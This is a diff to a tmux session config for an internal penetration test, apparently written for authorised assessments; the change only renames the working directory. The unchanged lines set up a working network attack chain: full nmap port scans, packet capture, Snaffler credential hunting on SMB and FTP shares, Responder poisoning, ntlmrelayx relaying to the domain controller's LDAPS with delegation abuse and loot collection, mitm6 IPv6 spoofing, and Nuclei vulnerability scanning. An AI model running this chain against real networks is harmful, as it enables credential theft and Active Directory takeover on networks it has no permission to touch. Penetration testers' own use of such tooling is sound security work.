@@ -10,9 +10,9 @@ windows:
     panes:
       - shell_command:
           - >-
-            cd ~/pentest2026/nmap &&
+            cd ~/TYPEOFTEST/nmap &&
             sudo -S nmap -vvv --max-retries=1 --max-rtt=300ms -Pn
-            -iL ~/pentest2026/nmap/livehosts.txt -oA Scope_Default_nmap_ports;
+            -iL ~/TYPEOFTEST/nmap/livehosts.txt -oA Scope_Default_nmap_ports;
             echo $? > nmap_default_exit.txt
 
 
@@ -20,9 +20,9 @@ windows:
     panes:
       - shell_command:
           - >-
-            cd ~/pentest2026/nmap &&
+            cd ~/TYPEOFTEST/nmap &&
             sudo -S nmap --reason -vvv --max-retries 0 --host-timeout 10m -Pn -p-
-            -iL ~/pentest2026/nmap/livehosts.txt -oA Scope_All_nmap_ports;
+            -iL ~/TYPEOFTEST/nmap/livehosts.txt -oA Scope_All_nmap_ports;
             echo $? > nmap_full_exit.txt
 
 
@@ -30,7 +30,7 @@ windows:
     panes:
       - shell_command:
           - >-
-            cd ~/pentest2026/ &&
+            cd ~/TYPEOFTEST/ &&
             mkdir -p captures &&
             sudo -S timeout 1800 tcpdump -i eth0 -w captures/capture.pcap;
             echo $? > captures/exit.txt
@@ -40,9 +40,9 @@ windows:
     panes:
       - shell_command:
           - >-
-            cd ~/pentest2026/{NAME}/SMB/Snaffler/anonymous &&
+            cd ~/TYPEOFTEST/{NAME}/SMB/Snaffler/anonymous &&
             mkdir -p run_logs && {
-              snaffler --rule-dir ~/pentest2026/{NAME}/Snaffler-Rules/rules
+              snaffler --rule-dir ~/TYPEOFTEST/{NAME}/Snaffler-Rules/rules
                 --username '' --password '' --domain {DOMAIN} --dc-host {DC_IP}
                 2>&1 | tee run_logs/output.log;
               echo $? > run_logs/exit.txt;
@@ -55,9 +55,9 @@ windows:
     panes:
       - shell_command:
           - >-
-            cd ~/pentest2026/{NAME}/SMB/Snaffler/pentest &&
+            cd ~/TYPEOFTEST/{NAME}/SMB/Snaffler/pentest &&
             mkdir -p run_logs && {
-              snaffler --rule-dir ~/pentest2026/{NAME}/Snaffler-Rules/rules
+              snaffler --rule-dir ~/TYPEOFTEST/{NAME}/Snaffler-Rules/rules
                 --username '{DOMAIN_USERNAME}' --password '{PASSWORD}' --domain {DOMAIN} --dc-host {DC_IP}
                 2>&1 | tee run_logs/output.log;
               echo $? > run_logs/exit.txt;
@@ -70,11 +70,11 @@ windows:
     panes:
       - shell_command:
           - >-
-            cd ~/pentest2026/{NAME}/FTP/Snaffler/anonymous &&
+            cd ~/TYPEOFTEST/{NAME}/FTP/Snaffler/anonymous &&
             mkdir -p run_logs && {
-              snaffler --rule-dir ~/pentest2026/{NAME}/Snaffler-Rules/rules
+              snaffler --rule-dir ~/TYPEOFTEST/{NAME}/Snaffler-Rules/rules
                 --username '' --password '' --domain {DOMAIN} --dc-host {DC_IP}
-                --ftp-file ~/pentest2026/{NAME}/livehosts.txt
+                --ftp-file ~/TYPEOFTEST/{NAME}/livehosts.txt
                 2>&1 | tee run_logs/output.log;
               echo $? > run_logs/exit.txt;
             };
@@ -86,11 +86,11 @@ windows:
     panes:
       - shell_command:
           - >-
-            cd ~/pentest2026/{NAME}/FTP/Snaffler/pentest &&
+            cd ~/TYPEOFTEST/{NAME}/FTP/Snaffler/pentest &&
             mkdir -p run_logs && {
-              snaffler --rule-dir ~/pentest2026/{NAME}/Snaffler-Rules/rules
+              snaffler --rule-dir ~/TYPEOFTEST/{NAME}/Snaffler-Rules/rules
                 --username '{DOMAIN_USERNAME}' --password '{PASSWORD}' --domain {DOMAIN} --dc-host {DC_IP}
-                --ftp-file ~/pentest2026/{NAME}/livehosts.txt
+                --ftp-file ~/TYPEOFTEST/{NAME}/livehosts.txt
                 2>&1 | tee run_logs/output.log;
               echo $? > run_logs/exit.txt;
             };
@@ -103,7 +103,7 @@ windows:
     panes:
       - shell_command:
           - >-
-            cd ~/pentest2026/{NAME}/Responder &&
+            cd ~/TYPEOFTEST/{NAME}/Responder &&
             mkdir -p responder_logs &&
             sudo -S sed -i -e 's/^HTTP[[:space:]]*=.*/HTTP = Off/' -e 's/^HTTPS[[:space:]]*=.*/HTTPS = Off/' -e 's/^SMB[[:space:]]*=.*/SMB = Off/' /etc/responder/Responder.conf &&
             sudo -S script -q responder_logs/session.log -c 'responder -I eth0 --lm --disable-ess --basic';
@@ -111,14 +111,14 @@ windows:
 
       - shell_command:
           - >-
-            cd ~/pentest2026/{NAME}/ntlmrelayx &&
+            cd ~/TYPEOFTEST/{NAME}/ntlmrelayx &&
             mkdir -p relay_logs &&
             sudo -S script -q relay_logs/session.log -c 'impacket-ntlmrelayx -6 -t ldaps://{DC_IP} -wh fakewpad.{DOMAIN} -socks -l relay_logs/loot --delegate-access';
             echo $? > relay_logs/exit.txt
 
       - shell_command:
           - >-
-            cd ~/pentest2026/{NAME}/mitm6 &&
+            cd ~/TYPEOFTEST/{NAME}/mitm6 &&
             mkdir -p mitm6_logs &&
             sudo -S script -q mitm6_logs/session.log -c 'mitm6 -d {DOMAIN} --ignore-nofqdn';
             echo $? > mitm6_logs/exit.txt
@@ -128,9 +128,9 @@ windows:
     panes:
       - shell_command:
           - >-
-            cd ~/pentest2026/amin/HTTP/Nuclei &&
+            cd ~/TYPEOFTEST/amin/HTTP/Nuclei &&
             mkdir -p nuclei_output && \
-            nuclei -l ~/pentest2026/amin/livehosts.txt -fr \
+            nuclei -l ~/TYPEOFTEST/amin/livehosts.txt -fr \
               -severity medium,high,critical \
               -etags bruteforce,dos \
               -rate-limit 120 -bulk-size 30 -concurrency 30 \
